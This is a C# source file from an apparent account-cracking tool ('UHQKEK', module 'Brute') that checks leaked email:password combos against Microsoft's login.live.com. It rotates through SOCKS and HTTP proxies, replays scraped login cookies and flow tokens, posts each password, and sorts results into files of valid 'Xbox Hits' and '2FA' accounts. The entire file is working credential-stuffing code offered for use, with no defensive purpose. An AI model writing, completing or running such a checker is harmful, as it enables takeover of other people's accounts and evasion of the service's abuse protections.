using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using UHQKEK.Start;
using Console = Colorful.Console;

namespace UHQKEK.Modules.Brute
{
    class XBox
    {
        public static bool check(string combo)
        {
            try
            {
                HttpRequest httpRequest = new HttpRequest()
                {
                    IgnoreProtocolErrors = true,
                    KeepAlive = true,
                    ConnectTimeout = 10000,
                    AllowEmptyHeaderValues = true
                };
                string[] strArray1 = combo.Split(':', ';', '|');
                string[] strArray2 = Program.Proxies.ElementAt<string>(new Random().Next(0, Program.Proxies.Count)).Split(':', ';', '|');
                ProxyClient proxyClient = Program.Proxytype == ProxyType.Socks5 ? new Socks5ProxyClient(strArray2[0], int.Parse(strArray2[1])) : Program.Proxytype == ProxyType.Socks4 ? new Socks4ProxyClient(strArray2[0], int.Parse(strArray2[1])) : (ProxyClient)new HttpProxyClient(strArray2[0], int.Parse(strArray2[1]));
                if (strArray2.Length == 4)
                {
                    proxyClient.Username = strArray2[2];
                    proxyClient.Password = strArray2[3];
                }
                httpRequest.Proxy = proxyClient;
                httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback)((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
                httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");
                httpRequest.AddHeader("Accept", "*/*");
                httpRequest.AllowAutoRedirect = true;
                CookieContainer container = new CookieContainer();
                string str1 = httpRequest.Get("https://login.live.com/").ToString();
                string cltid = Cryptography.LR(str1, "client_id=", "&scope").FirstOrDefault();
                string param = httpRequest.Cookies.GetCookies("https://login.live.com/")["OParams"].ToString();
                string MSPRequ = httpRequest.Cookies.GetCookies("https://login.live.com/")["MSPRequ"].ToString();
                string MSCC = httpRequest.Cookies.GetCookies("https://login.live.com/")["MSCC"].ToString();
                string MSPOK = httpRequest.Cookies.GetCookies("https://login.live.com/")["MSPOK"].ToString();
                string uaid = Cryptography.LR(str1, "&uaid=", "\" /> ").FirstOrDefault();
                httpRequest.ClearAllHeaders();
                httpRequest.AddHeader("Origin", "https://login.live.com");
                httpRequest.AddHeader("Referer", "https://login.live.com/ppsecure/InlineLogin.srf?id=80604&scid=6&mkt=en-GB&Platform=Windows10&clientid=S-1-15-2-2551677095-2355568638-4209445997-2436930744-3692183382-387691378-1866284433");
                httpRequest.AddHeader("Accept", "application/json");
                httpRequest.AddHeader("Content-type", "application/json; charset=utf-8");
                httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; MSAppHost/3.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18363");
                httpRequest.AddHeader("Host", "login.live.com");
                httpRequest.AddHeader("Cookie", "Cookie: MSPRequ=" + MSPRequ + "; uaid=" + uaid + "; MSCC=" + MSCC + "; OParams=" + param + "; MSPOK=$uuid-2ae5fc02-eb2c-4c9d-ba11-875c97c617b1");
                string str2 = httpRequest.Post("URL HERE" + uaid, "{\"username\":\"" + strArray1[0] + "\",\"uaid\":\"" + uaid + "\",\"isOtherIdpSupported\":false,\"isFederationDisabled\":true,\"checkPhones\":false,\"isRemoteNGCSupported\":true,\"isCookieBannerShown\":false,\"isFidoSupported\":false,\"forceotclogin\":false,\"otclogindisallowed\":false,\"isExternalFederationDisallowed\":true,\"isRemoteConnectSupported\":false,\"federationFlags\":0,\"isSignup\":false,\"flowToken\":\"Dfl!MvYijTdi1nWkFqsGXJKn7rdwdPgLC0zTpufcqeydi3Nd7niosS3fbN2pSgHuIssT!YTmzcEfOlbZR7mj7gLVQRUPHoCroyA*SVlOdX4t!GKC7QGs*AeB2u1mf7Tl7QLH2gkwkfxHBUdV4c59XQPRJm1X2VZ8jSzPOItb7R96p13hIb32t47PtQKKrZiCOpFVfB*SRQrTJ*sosMrSh60$\"}", "application/json").ToString();
                if (str2.Contains("IfExistsResult\":0"))
                {
                    httpRequest.ClearAllHeaders();
                    httpRequest.AddHeader("Referer", "https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13&rver=7.1.6819.0&wp=MBI_SSL&wreply=https:%2f%2faccount.xbox.com%2fen-us%2faccountcreation%3freturnUrl%3dhttps:%252f%252fwww.xbox.com:443%252fen-US%252f%26ru%3dhttps:%252f%252fwww.xbox.com%252fen-US%252f%26rtc%3d1&lc=1033&id=292543&aadredir=1");
                    httpRequest.AddHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
                    httpRequest.AddHeader("Content-Type", "application/x-www-form-urlencoded");
                    httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; MSAppHost/3.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18363");
                    httpRequest.AddHeader("Host", "login.live.com");
                    httpRequest.AddHeader("Cookie", "Cookie: MSPRequ=" + MSPRequ + "; uaid=" + uaid + "; MSCC=" + MSCC + "; OParams=" + param + "; MSPOK=$uuid-2ae5fc02-eb2c-4c9d-ba11-875c97c617b1");
                    string str3 = httpRequest.Post("URL HERE", "i13=0&login=" + strArray1[0] + "&loginfmt=" + strArray1[0] + "&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=" + strArray1[1] + "&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=Dfl%21MvYijTdi1nWkFqsGXJKn7rdwdPgLC0zTpufcqeydi3Nd7niosS3fbN2pSgHuIssT%21YTmzcEfOlbZR7mj7gLVQRUPHoCroyA*SVlOdX4t%21GKC7QGs*AeB2u1mf7Tl7QLH2gkwkfxHBUdV4c59XQPRJm1X2VZ8jSzPOItb7R96p13hIb32t47PtQKKrZiCOpFVfB*SRQrTJ*sosMrSh60%24&PPSX=Passpo&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&i2=106&i17=0&i18=&i19=223902", "application/x-www-form-urlencoded").ToString();
                    if (str3.Contains(@"account doesn\'t exist") || str3.Contains("incorrect") || str3.Contains("Please enter the password for your Microsoft account."))
                    {
                        ++Program.Fail;
                        ++Program.Check;
                        ++Program.Cps;
                        Program.remove(combo);
                        if (Program.Lock == "Y")
                        {
                            Console.WriteLine("[-]" + combo, Color.Red);
                        }
                        //Program.Save(combo, "Invalids");
                        return true;
                    }
                    else if (str3.Contains("PPAuth") || str3.Contains("WLSSC") || str3.Contains("action=\"https://outlook.live.com/owa"))
                    {
                        Interlocked.Increment(ref Program.Good);
                        ++Program.Check;
                        ++Program.Cps;
                        Program.remove(combo);
                        if (Program.Lock == "Y")
                        {
                            Console.WriteLine($" [+] {combo} ", Color.Green);
                        }
                        Program.Save(combo, "Xbox Hits");
                        return true;
                    }
                    else if (str3.Contains("action=\"https://account.live.com/recover") || str3.Contains("action=\"https://account.live.com/Abuse") || str3.Contains("action=\"https://account.live.com/ar/cancel") || str3.Contains("action=\"https://account.live.com/identity/confirm") || str3.Contains("title>Help us protect your account") || str3.Contains("action=\"https://account.live.com/RecoverAccount") || str3.Contains("action=\"https://account.live.com/Email/Confirm") || str3.Contains("action=\"https://account.live.com/Email/Confirm") || str3.Contains("action=\"https://account.live.com/Abuse") || str3.Contains("action=\"https://account.live.com/profile/accrue"))
                    {
                        ++Program.Free;
                        ++Program.Check;
                        ++Program.Cps;
                        if (Program.Lock == "Y")
                        {
                            Console.WriteLine($" [+] {combo} ", Color.Orange);
                        }
                        Program.Save(combo, "Xbox 2FA");
                        return true;
                    }
                    else
                    {
                        ++Program.Retrie;
                        return false;
                    }

                }
                else if (str2.Contains("IfExistsResult\":1"))
                {
                    ++Program.Fail;
                    ++Program.Check;
                    ++Program.Cps;
                    Program.remove(combo);
                    if (Program.Lock == "Y")
                    {
                        Console.WriteLine("[-]" + combo, Color.Red);
                    }
                    //Program.Save(combo, "Invalids");
                    return true;
                }
                else
                {
                    ++Program.Retrie;
                    return false;
                }
            }
            catch
            {
                ++Program.Retrie;
                return false;
            }
        }
    }
}
